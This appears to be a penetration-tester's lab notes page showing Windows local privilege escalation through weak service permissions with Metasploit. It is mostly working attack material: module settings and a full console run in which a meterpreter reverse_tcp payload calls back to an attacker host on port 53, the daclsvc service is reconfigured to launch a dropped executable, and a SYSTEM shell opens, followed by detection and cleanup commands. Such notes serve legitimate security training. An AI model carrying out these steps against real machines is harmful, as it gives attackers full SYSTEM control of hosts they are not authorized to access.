# Metasploit

## 01 - Usage

MSF Windows Escalate Service Permissions Local Privilege Escalation Local Exploit Module

```
msf > use exploit/windows/local/service_permissions

msf exploit(windows/local/service_permissions) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/service_permissions) > options

Module options (exploit/windows/local/service_permissions):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
   SESSION                      yes       The session to run this module on
   TIMEOUT     10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target: 

   Id  Name 
   --  ---- 
   0   Automatic 



msf exploit(windows/local/service_permissions) > set lhost <IP>

msf exploit(windows/local/service_permissions) > set session <session_id>

msf exploit(windows/local/service_permissions) > set TargetServiceName <service_name>

msf exploit(windows/local/service_permissions) > run
```

Manually using metepreter `execute` command to start service.

```
meterpreter > execute -Hif sc -a "start <service_name>"
```

## 02 - Detect

```
meterpreter > shell
Process 3448 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name,startname,pathname | findstr /i "localsystem" | findstr /i "C:\program files"
..[truncated]..
daclsvc                              "C:\Program Files\DACL Service\daclservice.exe"                                            LocalSystem
..[truncated]..

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query daclsvc

Name        : daclsvc
Display     : DACL Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : "C:\Program Files\DACL Service\daclservice.exe"
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLORC;;;WD)
```

## 03 - Exploit

Note: Give it a few a minutes or so since this will take long to get a session

```
meterpreter > bg
[*] Backgrounding session 1...

msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/service_permissions
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/service_permissions) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/service_permissions) > options

Module options (exploit/windows/local/service_permissions):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
   SESSION                      yes       The session to run this module on
   TIMEOUT     10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/service_permissions) > set lhost 10.8.145.108
lhost => 10.8.145.108
msf6 exploit(windows/local/service_permissions) > set lport 53
lport => 53
msf6 exploit(windows/local/service_permissions) > set targetservicename daclsvc
targetservicename => daclsvc
msf6 exploit(windows/local/service_permissions) > set session 1
session => 1
msf6 exploit(windows/local/service_permissions) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53 
[*] Trying to find weak permissions in existing services..
[+] [daclsvc]  has weak configuration permissions - reconfigured to use exe C:\Users\user\AppData\Local\Temp\ifPuAY.exe
[*] [daclsvc] Restarting service
[*] Sending stage (200774 bytes) to 10.10.229.49
[+] [daclsvc] Service restarted
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.229.49:49259) at 2022-05-29 16:02:17 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 04 - Cleanup

```
meterpreter > rm "C:\Users\user\AppData\Local\Temp\ifPuAY.exe"
```

---
## References

- [PentestLab Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)